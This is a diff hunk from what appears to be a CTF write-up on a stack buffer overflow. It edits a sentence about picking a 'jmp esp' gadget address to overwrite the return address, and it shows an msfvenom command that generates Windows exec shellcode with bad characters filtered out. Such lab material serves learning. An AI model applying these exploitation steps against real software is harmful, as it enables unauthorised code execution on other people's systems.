@@ -212,7 +212,7 @@ skid@TheGreen:~$
 <img width="1470" height="1438" alt="image" src="https://github.com/user-attachments/assets/0cd782ea-04e9-42ed-aa86-a59550187944" />
 <br>
 
-**But we are only gona use the addr that starts with addr 080.... cuz our function is around this range and there are 2. Lets use first one first - 080414C3 and test it, We will put this in return addr and then it returns to jmp esp and this esp we will find out it this is the one which jumps to our data.**
+**But we are only gona use the addr that starts with addr 080.... cuz our function is around this range and there are 2. Lets use first one first - 080414C3 and test it, We will put this in return addr and then it returns to jmp esp and later we will find out it this is the one which jumps to our data after testing..**
 
 ```
 skid@TheGreen:~/ctfs$ msfvenom -p windows/exec CMD=notepad.exe EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v sc
